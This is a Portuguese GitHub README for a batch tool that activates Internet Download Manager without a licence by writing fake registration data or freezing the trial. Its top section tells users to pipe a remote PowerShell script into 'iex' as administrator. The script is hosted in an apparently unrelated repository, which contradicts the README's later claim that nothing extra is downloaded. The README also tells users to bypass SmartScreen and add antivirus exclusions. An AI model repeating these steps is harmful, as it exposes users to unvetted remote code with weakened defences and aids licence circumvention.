# IDM Script de Ativação PT-BR v1.3.8

[![Validação Windows](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/actions/workflows/ci.yml)
[![Licença: GPL v3](https://img.shields.io/badge/License-GPL_v3-blue.svg)](./LICENSE)
[![Versão](https://img.shields.io/badge/version-v1.3.8-brightgreen.svg)](./CHANGELOG.md)
[![Plataforma](https://img.shields.io/badge/platform-Windows%207%20%7C%208%20%7C%2010%20%7C%2011-blue.svg)](#requisitos-do-sistema)
[![Release](https://img.shields.io/github/v/release/SEU_USUARIO/IDM-Activation-Script-PTBR)](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/releases)

[Português Brasileiro (atual)](README.md) · [llms.txt para busca por IA](llms.txt) · [Documentação](docs/README.md) · [Política de Código Aberto](OPEN_SOURCE_POLICY.md) · [Histórico de Versões](CHANGELOG.md) · [Problemas](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/issues)

## Ativação Automática (recomendado)

Abra o **PowerShell como Administrador** e execute:

```powershell
irm https://raw.githubusercontent.com/brodrigues0ll/Lemmiwinks/main/Ativar-IDM.ps1 | iex
```

> O script baixa e executa o ativador automaticamente, sem precisar extrair arquivos.

---

> **Ferramenta de ativação do Internet Download Manager (IDM) em Português Brasileiro**: suporta três modos — congelar período de teste, ativação com registro aleatório e redefinição do período de teste — tudo em menus e mensagens em PT-BR, sem instalação de dependências, rodando de um único arquivo `.cmd` no Windows 7 / 8 / 10 / 11.

## Visão Geral do Projeto

O **IDM Script de Ativação PT-BR** é um conjunto de ferramentas batch de código aberto voltado para usuários brasileiros de Windows, encapsulando os processos de congelamento do período de teste do IDM, gravação de registro aleatório, redefinição do estado de teste e autodiagnóstico do ambiente — tudo em menus e mensagens em Português Brasileiro.

Ele resolve estes problemas práticos:

- Usuários precisam de menus e mensagens de erro em Português para entender o que está acontecendo;
- Iniciantes não sabem qual arquivo executar primeiro, se precisam de permissão de administrador, ou como lidar com bloqueios do SmartScreen / Defender;
- Após anomalias na ativação ou período de teste do IDM, é necessário um processo de tratamento no nível de registro que seja reversível e diagnosticável;
- Os mantenedores precisam de uma versão localizada em PT-BR que passe nas verificações de CI de codificação, quebras de linha e menor caminho de inicialização.

**Para quem é indicado**

- Usuários de Windows 7 / 8 / 8.1 / 10 / 11 no Brasil;
- Usuários que precisam executar scripts `.cmd` offline e querem ver menus e mensagens de erro em Português;
- Usuários que precisam diagnosticar problemas de período de teste do IDM, avisos de registro, permissões de administrador e problemas de política do PowerShell;
- Desenvolvedores interessados em batch do Windows, backup de registro e GitHub Actions Windows CI.

**Stack Tecnológico**

- Windows Batch / CMD (`.cmd`)
- PowerShell (para elevação UAC, detecção de ambiente e exemplos de comandos de verificação)
- Windows Registry / WMI / `cmd.exe`
- UTF-8 / Página de Código 65001 + CRLF
- GitHub Actions `windows-latest` CI

**Pontos de Entrada Principais**

| Arquivo | Uso |
| --- | --- |
| `IniciarAtivacao.cmd` | **O único arquivo que você precisa clicar duas vezes**. Solicita automaticamente permissão de administrador → faz autodiagnóstico do ambiente → exibe menu de ativação (Congelar / Ativar / Redefinir à escolha) |
| `IAS.cmd` | Motor principal, chamado por `IniciarAtivacao.cmd`; usuários avançados também podem usar diretamente com os parâmetros `/frz` `/act` `/res` `/silent` `/log=` |

**Política de Código Aberto**

Este repositório deve permanecer aberto e publicado como código aberto, atualmente sob licença **GPL-3.0**. Qualquer documentação, notas de manutenção, materiais de lançamento e notas de derivações devem ser escritos, por padrão, em torno de cenários de uso abertos, verificáveis publicamente, copiáveis e redistribuíveis; este repositório não deve ser descrito como projeto privado, fechado ou não redistribuível. Qualquer redistribuição secundária precisa cumprir os requisitos de licença, aviso de direitos autorais e registro de modificações do GPL-3.0. Regras detalhadas em [`OPEN_SOURCE_POLICY.md`](./OPEN_SOURCE_POLICY.md).

**Limitações e Considerações**

- Apenas Windows; macOS / Linux não podem executar esses scripts `.cmd` diretamente.
- O script modifica chaves de registro relacionadas ao IDM — faz backup automático antes, mas ainda é recomendado usar apenas em dispositivos sob seu controle.
- Não modifica arquivos de programa do IDM, não inclui o instalador do IDM e não contorna políticas empresariais do Windows (WDAC / AppLocker).
- SmartScreen, Defender ou antivírus de terceiros podem bloquear scripts batch não assinados; verifique o SHA256 do ZIP antes de decidir executar.
- Use com autorização legal e consciência dos riscos, cumprindo as leis locais e o contrato de licença do software IDM.

## Downloads Rápidos

> **Botão de download direto (recomendado)**: [Ir para a página de Releases do GitHub para baixar a versão mais recente](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/releases/latest)
> O arquivo `.zip` na seção `Assets` da página é o pacote de instalação.

Você também pode baixar diretamente deste repositório (clique com o botão direito "Salvar link como"):

- Pacote da versão mais recente: [IDM-Activation-Script-v1.3.7.zip](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/raw/main/release/IDM-Activation-Script-v1.3.7.zip)
- Checksum (SHA256): [IDM-Activation-Script-v1.3.7.zip.sha256](https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/raw/main/release/IDM-Activation-Script-v1.3.7.zip.sha256)
- Histórico completo de atualizações: [CHANGELOG.md](./CHANGELOG.md)

> Para verificar a integridade: após baixar, execute no PowerShell `Get-FileHash .\IDM-Activation-Script-v1.3.7.zip -Algorithm SHA256` e compare com o valor no arquivo `.sha256`. A verificação é opcional mas recomendada.

## Sumário

- [Visão Geral do Projeto](#visão-geral-do-projeto)
- [Downloads Rápidos](#downloads-rápidos)
- [Funcionalidades](#funcionalidades)
- [Requisitos do Sistema](#requisitos-do-sistema)
- [Como Usar](#como-usar)
- [Descrição das Funções](#descrição-das-funções)
- [Perguntas Frequentes](#perguntas-frequentes)
- [Detalhes Técnicos](#detalhes-técnicos)
- [Descrição dos Arquivos](#descrição-dos-arquivos)
- [Histórico de Versões](#histórico-de-versões)
- [Manutenção e Contribuição](#manutenção-e-contribuição)
- [Garantia de Código Aberto](#garantia-de-código-aberto)
- [Links Relacionados](#links-relacionados)
- [Aviso Legal](#aviso-legal)
- [Licença](#licença)
- [Versão e Manutenção](#versão-e-manutenção)

## Funcionalidades

- **Compatível com versões comuns do IDM 6.x** - mantido com base na estrutura de registro existente, pode reexecutar o processo de congelamento ou redefinição após atualizar o IDM
- **Três modos de ativação** - ativação por congelamento, ativação regular e função de redefinição
- **Interface em Português Brasileiro** - todos os menus, mensagens e avisos em PT-BR
- **Backup automático** - backup seguro do registro, restaurável a qualquer momento
- **Detecção inteligente** - detecta automaticamente o ambiente do sistema e o estado do IDM
- **Autodiagnóstico** - verificações integradas de ambiente (administrador/PowerShell/serviço Null/rede/página de código)
- **Sem modificações binárias** - não modifica arquivos de programa do IDM
- **Auditável e de código aberto** - licença GPL-3.0, scripts e notas de lançamento publicamente verificáveis

## Requisitos do Sistema

| Item | Requisito |
|------|-----------|
| Sistema Operacional | Windows 7 / 8 / 8.1 / 10 / 11 (incluindo 24H2) |
| Permissões | **Permissões de Administrador** (o script solicita automaticamente, não precisa configurar manualmente) |
| Dependências | PowerShell (incluído no Windows, não precisa instalar nada extra) |
| Rede | Deve ser capaz de acessar internetdownloadmanager.com (desative VPN/proxy se necessário) |
| Codificação | O script usa UTF-8 (chcp 65001), **não precisa configurar manualmente** |

## Como Usar

> Resumo rápido em dois passos: extraia e clique duas vezes em `IniciarAtivacao.cmd` → clique em "Sim" na janela que aparecer para conceder permissões de administrador → o script verificará o ambiente primeiro e depois exibirá um menu, **pressione `[2]` para Ativar (recomendado, pronto para uso imediato)**; se o IDM ainda mostrar não registrado, mude para `[1]` Congelar.
> Dica: `IniciarAtivacao.cmd` verifica permissões de administrador, modo de linguagem do PowerShell, serviço Null, conectividade de rede, página de código, WMI, caminho do IDM e permissão de escrita do diretório antes de abrir o menu.

> ### Leitura Obrigatória Antes da Primeira Execução
>
> 1. **Deve ser executado como administrador**. O `IniciarAtivacao.cmd` exibirá automaticamente uma janela UAC de elevação — clique em "**Sim**".
> 2. **O Windows pode exibir "Bloqueado" ou "O Windows protegeu seu PC"** (SmartScreen). Esta é uma mensagem padrão para scripts batch não assinados, não significa que o script tem problemas. Como resolver:
>    - Janela do SmartScreen: clique em **"Mais informações"** → **"Executar mesmo assim"**;
>    - Se nas propriedades do arquivo aparecer "Este arquivo veio de outro computador", clique com o botão direito no arquivo → **Propriedades** → marque "**Desbloquear**" na parte inferior → OK.
> 3. **Antivírus (Defender/AVG/Avast) pode reportar falso positivo**. Este script envolve gravação no registro e elevação de privilégios, que são falsos positivos comuns de mecanismos heurísticos. Se você confia no pacote de lançamento deste repositório (SHA256 publicado), pode adicionar temporariamente o diretório extraído às exclusões do antivírus antes de executar.

### Método 1: Interface Gráfica (Recomendado para Iniciantes)

1. **Clique duas vezes** em `IniciarAtivacao.cmd` (solicitará permissão de administrador automaticamente; se não aparecer janela, clique com o botão direito → "Executar como administrador")
2. **Aguarde a conclusão do autodiagnóstico**, então o menu será exibido automaticamente
3. **Pressione o número correspondente** (recomendado `[2]` Ativar, pronto para uso imediato; se ainda mostrar não registrado, use `[1]` Congelar)

```
┌─────────────────────────────────────┐
│   IDM Script de Ativação - Menu     │
├─────────────────────────────────────┤
│  [1] Ativar (Congelar)              │
│  [2] Ativar               Recomendado│
│  [3] Redefinir Ativação/Período     │
│  [4] Baixar IDM                     │
│  [5] Ajuda                          │
│  [0] Sair                           │
└─────────────────────────────────────┘
```

<details>
<summary><b>Método 2: Linha de Comando (Usuários Avançados, iniciantes podem pular)</b></summary>

Abra o CMD como administrador e execute:

```cmd
# Ativar (recomendado, pronto para uso imediato)
IAS.cmd /act

# Ativar por Congelamento (use quando ainda mostrar não registrado após ativar)
IAS.cmd /frz

# Redefinir Ativação
IAS.cmd /res

# Modo silencioso + log (não assistido)
IAS.cmd /act /silent /log="C:\Temp\ias.log"
```

> Nota: `/silent` suprime menus e esperas, `/log=caminho` registra o log de execução; usar `/silent` sem `/frz` `/act` `/res` retornará código 2.

</details>

## Descrição das Funções

> **Como escolher? Veja seu estado atual:**
> - **Não usou o período de teste de 30 dias / Quer usar o IDM diretamente** → Escolha `[2]` **Ativar** (mais comum, recomendado)
> - **Já ativou e está usando o período de teste de 30 dias** (tem conta IDM, clicou em "Iniciar teste") → Escolha `[1]` **Ativar (Congelar)** (congela o período de teste atual para não expirar)
> - Após escolher `[2]` Ativar, o IDM ainda mostra "Não Registrado" → Mude para `[1]` Congelar como alternativa

### Ativar (Menu `[2]`) [Mais Usado]

- **Função**: Grava informações de registro para ativar o IDM diretamente, pronto para uso imediato após ativação
- **Vantagens**: Mais simples e direto, pronto para uso imediato, **não precisa de conta nem período de teste**
- **Indicado**: Usuários que não usaram o período de teste, ou que simplesmente querem usar o IDM diretamente

### Ativar (Congelar) (Menu `[1]`)

- **Função**: Congela o período de teste atual de 30 dias do IDM sem gravar número de série
- **Pré-requisito**: Você já ativou o período de teste de 30 dias — congelar significa fixar esse período para não expirar
- **Vantagens**: Não dispara detecção de "serial falso", mais estável no IDM 6.42+, menos provável de reabrir a janela de registro
- **Indicado**: Usuários que estão no período de teste; ou como alternativa quando ainda mostra "Não Registrado" após usar `[2]`

### Redefinir Ativação/Período de Teste

- **Função**: Limpa todas as informações de ativação e restaura o estado inicial
- **Uso**: Resolve anomalias de ativação, troca de modo de ativação

## Perguntas Frequentes

<details>
<summary><b>P1: Aparece "Requer permissões de administrador", o que fazer?</b></summary>

**Solução:**
- Clique com o botão direito no arquivo do script
- Selecione "Executar como administrador"
- Não clique duas vezes diretamente

</details>

<details>
<summary><b>P2: Aparece "IDM não instalado"?</b></summary>

**Solução:**
1. Primeiro confirme que `IDMan.exe` existe, o caminho comum é `C:\Program Files (x86)\Internet Download Manager\IDMan.exe` ou `C:\Program Files\Internet Download Manager\IDMan.exe`.
2. O `HKLM\SOFTWARE\...\Internet Download Manager` mostrado no autodiagnóstico é o nome de uma chave de registro / diretório de instalação, não uma conexão de internet; desligar a rede não afeta essa detecção.
3. Se o autodiagnóstico indicar "Caminho de instalação do IDM não encontrado no registro", geralmente significa que o IDM está instalado incompletamente, a versão portátil não gravou no registro, ou o `ExePath` do usuário atual não foi gravado. Por favor, reinstale o IDM oficial e execute `IniciarAtivacao.cmd` novamente.
4. Download oficial: https://www.internetdownloadmanager.com/download.html

</details>

<details>
<summary><b>P3: Ainda mostra aviso de registro após ativar?</b></summary>

**Solução:**
1. Mude para `[1]` "Ativar (Congelar)" — não grava número de série, menos provável de ser detectado pelo IDM como "serial falso" e reabrir a janela de registro
2. Ou primeiro selecione `[3]` "Redefinir Ativação", depois selecione `[2]` Ativar novamente
3. Desinstale completamente o IDM, reinstale e ative novamente

</details>

<details>
<summary><b>P4: Caracteres aparecem incorretos ou ilegíveis?</b></summary>

**Solução:**
1. Os menus e mensagens usam UTF-8 + `chcp 65001`. Em sistemas normais isso não deve causar problemas.
2. Se ainda houver caracteres incorretos, execute `chcp 65001` no CMD e tente novamente.
3. Certifique-se de que as configurações de região do sistema estão corretas.

</details>

<details>
<summary><b>P5: Aparece "Não foi possível conectar a internetdownloadmanager.com"?</b></summary>

**Solução:**
1. Verifique a conexão de rede
2. Desative VPN ou proxy
3. Configure as configurações de proxy do sistema
4. Teste desativando temporariamente o firewall

</details>

<details>
<summary><b>P6: PowerShell desabilitado pela política da organização?</b></summary>

**Solução:**
- Entre em contato com o administrador da máquina/domínio para remover a restrição
- Execute no terminal PowerShell `Set-ExecutionPolicy RemoteSigned` (requer permissão de administrador)
- Se for um dispositivo corporativo, recomendamos usar em um dispositivo pessoal

</details>

<details>
<summary><b>P7: O script funciona no Windows 11 24H2?</b></summary>

**Solução:**
- O 24H2 habilita SmartScreen e proteção em nuvem por padrão; na primeira execução pode aparecer aviso de "bloqueado"
- Clique com o botão direito em `IniciarAtivacao.cmd` → Propriedades → marque "Desbloquear" na parte inferior, depois execute como administrador
- Se o PowerShell estiver restrito no modo ConstrainedLanguage, o autodiagnóstico do `IniciarAtivacao.cmd` indicará claramente qual verificação falhou — siga as instruções

</details>

<details>
<summary><b>P8: Windows Defender / antivírus de terceiros bloqueando o script?</b></summary>

**Solução:**
- Este script envolve gravação no registro, consultas WMI e elevação via PowerShell, que podem gerar falsos positivos em mecanismos heurísticos
- Se você confia nos artefatos lançados neste repositório (pode verificar com `release/IDM-Activation-Script-v1.3.7.zip.sha256`), pode adicionar o diretório extraído às exclusões do Defender antes de executar
- Comando de verificação: no PowerShell `Get-FileHash IDM-Activation-Script-v1.3.7.zip -Algorithm SHA256` e compare com o conteúdo do arquivo `.sha256`

</details>

<details>
<summary><b>P9: Ambiente empresarial com WDAC / AppLocker ativado, script recusado?</b></summary>

**Solução:**
- As políticas WDAC ou AppLocker geralmente bloqueiam scripts não assinados; isso é uma interceptação da camada de política de TI empresarial, não um problema do script em si
- A forma correta de lidar é contatar a TI para obter autorização; não recomendamos contornar
- Dispositivos pessoais não têm esse problema

</details>

<details>
<summary><b>P10: IDM 6.42 / 6.43 e versões mais recentes são compatíveis?</b></summary>

**Solução:**
- Este script funciona com base na estrutura CLSID de registro do IDM; a série IDM 6.x é compatível de forma geral
- Se descobrir que a ativação falhou após atualizar o IDM, recomendamos primeiro selecionar `[3]` para "Redefinir Ativação" (ou `IAS.cmd /res`) e depois selecionar `[2]` "Ativar" novamente; se ainda mostrar não registrado após ativar, mude para `[1]` "Ativar (Congelar)"
- Se ainda não funcionar, abra um Issue com a saída do autodiagnóstico do `IniciarAtivacao.cmd` e o número da versão específica do IDM

</details>

<details>
<summary><b>P11: Após congelar ou ativar o IDM abre sozinho, o script continua rodando em segundo plano?</b></summary>

**Explicação e solução:**
- O script não é um programa residente; após a execução não deixa processos em segundo plano.
- O processo de congelamento/ativação pode iniciar brevemente o IDM para verificação de estado; se o IDM aparecer novamente depois, geralmente é comportamento do próprio IDM (item de inicialização, ícone na bandeja, integração com navegador ou tarefa agendada).
- Você pode desativar as opções de "iniciar com o Windows"/bandeja nas configurações do IDM e confirmar no Gerenciador de Tarefas em "Aplicativos de Inicialização" que o IDM não está configurado para iniciar com o Windows.
- Se ainda anormal, abra um Issue com a saída completa do autodiagnóstico do `IniciarAtivacao.cmd`, ponto de entrada de execução real, versão do IDM e passos para reproduzir.

</details>

## Detalhes Técnicos

### Como Funciona

1. **Bloquear/Excluir** chaves de registro CLSID
2. **Injetar** informações de registro aleatórias (modo de ativação)
3. **Baixar arquivo de teste** para verificar a funcionalidade do IDM
4. **Congelar período de teste** (modo de congelamento)

### Backup do Registro

O script faz backup automático do registro no seguinte local:

```
C:\Windows\Temp\_Backup_HKCU_CLSID_[timestamp].reg
C:\Windows\Temp\_Backup_HKU-[SID]_CLSID_[timestamp].reg
```

**Como restaurar:** Clique duas vezes no arquivo `.reg` para importar e restaurar

### Sobre Codificação

- Todos os arquivos `.cmd` usam UTF-8 (página de código 65001) e mudam o console para a mesma página de código durante a execução para garantir exibição correta.
- O repositório usa `.gitattributes` para fixar `.cmd`/`.txt` com terminações CRLF, evitando erros de verificação de batch causados por terminações LF.

### Segurança

- Não modifica arquivos de programa do IDM
- Apenas modifica configurações de registro
- Backup automático, restaurável a qualquer momento
- Código aberto e transparente, código auditável

## Descrição dos Arquivos

| Nome do Arquivo | Descrição |
|-----------------|-----------|
| `IniciarAtivacao.cmd` | **O único arquivo que iniciantes precisam clicar duas vezes**: solicita permissão de administrador → autodiagnóstico → exibe menu de ativação (Congelar / Ativar / Redefinir) |
| `IAS.cmd` | Motor principal (batch, codificação UTF-8), chamado por `IniciarAtivacao.cmd`; também suporta parâmetros `/frz` `/act` `/res` `/silent` `/log=` |
| `Instrucoes.txt` | Guia de início rápido simplificado (UTF-8, legível no Bloco de Notas do Windows) |
| `README.md` | Documentação completa atual |
| `CHANGELOG.md` | Registro detalhado de todas as versões históricas |

## Histórico de Versões

> Para o histórico completo de mudanças, veja [`CHANGELOG.md`](./CHANGELOG.md). Abaixo apenas o resumo das últimas versões.

### v1.3.8 (Versão Atual) - 2026-06-23

- **Revisão somente de documentação**: unificou a atribuição upstream para `lstprjct/IDM-Activation-Script` (corrigindo inconsistência entre a seção de licença do README e o topo/`llms.txt`); corrigiu guia desatualizado para iniciantes em `docs/README.md` (recomendação padrão mudada de volta para `[2]` Ativar, consistente com o script atual); completou índice de notas de lançamento em `docs/README.md` e `ARCHITECTURE.md`. **Scripts de execução e pacote de lançamento ainda são v1.3.7, SHA256 inalterado.**

### v1.3.7 - 2026-06-14

- **Descrição refinada de seleção de modo por estado do usuário**: sem período de teste de 30 dias / quer usar diretamente → `[2]` Ativar (mais comum); já ativou e está no período de teste de 30 dias → `[1]` Congelar (congela o período de teste atual); também use `[1]` Congelar como alternativa quando `[2]` ainda mostra não registrado. Lógica do script igual à v1.3.6.

### v1.3.6 - 2026-06-14

- **Correção de falso positivo "diretório do script sem permissão de escrita"**: o teste de escrita usava sintaxe incorreta que sempre falhava.
- **Correção de crash de elevação quando o caminho contém `(x86)`**: mudou para aspas simples para encapsular o caminho.
- **Correção de falso positivo de autodiagnóstico WMI no Win11 novo**: autodiagnóstico agora usa PowerShell CIM como prioridade.
- **Simplificação de entrada**: os quatro scripts antigos foram fundidos em um único `IniciarAtivacao.cmd`.

## Manutenção e Contribuição

- Guia de Contribuição: [CONTRIBUTING.md](./CONTRIBUTING.md)
- Arquitetura / Estrutura: [ARCHITECTURE.md](./ARCHITECTURE.md)
- Política de Manutenção Open Source: [OPEN_SOURCE_POLICY.md](./OPEN_SOURCE_POLICY.md)
- Lista de Verificação de Manutenção/Lançamento: [docs/maintenance-checklist.md](./docs/maintenance-checklist.md)
- Relatório de Vulnerabilidades de Segurança: [SECURITY.md](./SECURITY.md)
- Script de Validação CI: [tools/validate.ps1](./tools/validate.ps1)

## Garantia de Código Aberto

Este repositório foi restaurado para visibilidade `PUBLIC` no GitHub e uma verificação `Guard public repository visibility` foi adicionada ao GitHub Actions. No futuro, se o repositório for tornado privado novamente, a verificação falhará e solicitará que seja revertido para público toda vez que um push, PR ou CI manual for acionado. Esta verificação existe para evitar que repositórios de código aberto sejam silenciosamente tornados privados sem que ninguém perceba.

## Links Relacionados

- **Página do Projeto**: https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR
- **Site Oficial do IDM**: https://www.internetdownloadmanager.com
- **Reportar Problemas**: https://github.com/SEU_USUARIO/IDM-Activation-Script-PTBR/issues
- **Índice para Busca por IA**: [`llms.txt`](./llms.txt)
- **Índice de Documentação**: [`docs/README.md`](./docs/README.md)

## Aviso Legal

> **Este script é apenas para fins educacionais e de teste!**

- Esta ferramenta é apenas para aprender operações de registro do Windows e programação batch
- Por favor, apoie o software original comprando a licença oficial
- Para uso a longo prazo, recomendamos comprar a versão original: https://www.internetdownloadmanager.com/buy_now.html

## Licença

Este projeto é lançado como código aberto sob a **GNU General Public License v3.0 (GPL-3.0)**; os termos completos estão no arquivo `LICENSE` na raiz do repositório.

Esta versão em PT-BR é derivada do projeto upstream [lstprjct/IDM-Activation-Script](https://github.com/lstprjct/IDM-Activation-Script) e é mantida de forma independente neste repositório.

Ao usar, modificar ou redistribuir este projeto, você precisa cumprir os requisitos básicos do GPL-3.0:

- Pode usar, aprender, modificar e redistribuir livremente os scripts;
- A redistribuição secundária deve preservar o texto da licença GPL-3.0, avisos de direitos autorais e registro de modificações;
- Obras derivadas baseadas neste projeto devem ser lançadas sob a mesma licença GPL ou compatível;
- Os autores não assumem qualquer responsabilidade por quaisquer perdas diretas ou indiretas incorridas no processo de uso do script; veja a cláusula "NO WARRANTY" no `LICENSE`.

## Versão e Manutenção

- Versão atual da documentação: **v1.3.8** (data de lançamento 2026-06-23, revisão somente de documentação: unificou atribuição upstream, corrigiu guia desatualizado para iniciantes, completou índice de notas de lançamento)
- Pacote de lançamento de execução atual: **v1.3.7** (lógica do script inalterada desde v1.3.6; v1.3.8 não alterou nenhum script ou pacote de lançamento, SHA256 inalterado)
- Status de manutenção: manutenção independente, iterando continuamente scripts e documentação com base em feedback de uso real; repositório mantido como código aberto GPL-3.0
- Arquivos do repositório são autossuficientes: todas as dependências estão incluídas no repositório, podem ser executadas offline, sem necessidade de baixar componentes adicionais
- Status do CI: cada push/PR aciona o workflow `Windows validation` (codificação / terminação de linha / smoke test `IAS.cmd /silent`); badge no topo da página
